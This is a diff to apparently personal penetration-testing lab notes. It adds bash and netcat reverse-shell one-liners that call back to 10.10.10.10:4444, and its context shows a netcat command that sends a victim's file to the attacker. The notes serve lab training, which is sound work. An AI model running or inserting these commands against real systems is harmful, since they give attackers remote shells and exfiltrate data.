@@ -1,7 +1,5 @@
 # Useful Commands
 
-> This section will include commands / code I used in the lab environment that I found useful
-
 ## Web server
 
 ### With Python
@@ -35,12 +33,21 @@ Victim: ```cat file.txt | nc -q 0 10.10.10.10 4444```
 
 Kali:   ```nc -lvp 4444 > file.txt```
 
-## Reverse shells 
+## Reverse shells
 
+### With bash
+
+```
+bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+```
+
+### With netcat
+
+```
+nc -e /bin/sh 10.10.10.10 4444
+```
 
 # Enumeration
-
-> Enumeration is the most important thing you can do, at that inevitable stage where you find yourself hitting a wall, 90% of the time it will be because you haven’t done enough enumeration
 
 ### Nmap
 
